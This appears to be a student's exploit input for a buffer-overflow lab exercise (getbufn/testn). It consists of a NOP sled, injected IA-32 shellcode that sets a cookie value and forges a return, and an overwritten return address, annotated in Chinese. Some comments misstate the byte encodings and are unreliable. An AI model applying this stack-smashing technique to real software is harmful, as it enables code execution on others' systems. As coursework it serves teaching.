90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 89 e5 8d  /* 89 e5 ==> mov %esp , %ebp  */
85 28 00 00  /* 8b bd 28 00 00 00 ==> lea 0x28(ebp), %eax */ 
00 89 c5 b8  /* 89 c5 ==> mov %eax, %ebp */ 
86 6c 40 1e  /* mov 0x1e406c86(my cookie) to %eax */
83 ec 04 c7  /* 83 ec 04 ==> sub $0x4 , %esp , 这里要保证返回到 testn 的时候 esp 不变 , 下文中有 ret ==> esp + 4，所以这里要 - 4 */
04 24 3a 8e  /* c7 04 24 be 8d 04 08 ==> movl 0x08048e3a %esp */
04 08 c3 00  /*  c3 ==> ret */
a8 36 68 55  /* stack addr */
00 00 00 00  /* sub 0x4, %esp 之后多出来的部分 */
3a 8e 04 08  /* getbufn continue addr */

/* 注意过程调用中 push 和 pop 以及过程调用结束后 %esp 的值 */
/* leave 指令本质是 mov %ebp, %esp ，然后 pop %ebp */
